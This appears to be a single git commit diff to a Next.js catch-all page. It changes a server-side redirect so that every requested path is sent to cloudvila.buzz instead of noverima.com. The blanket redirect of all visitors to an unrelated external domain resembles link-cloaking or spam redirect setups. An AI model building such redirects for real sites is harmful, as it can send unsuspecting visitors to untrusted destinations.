87d6f2bb344ccc1209326ff1bf9c96ebaa27b265
IMTIAZ AKING <98144321+AKING110@users.noreply.github.com>
2024-08-02 00:05:30 +0500

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://noverima.com/` + encodeURI(path as string)
+					`https://cloudvila.buzz/` + encodeURI(path as string)
 				}`,
 			},
 		};
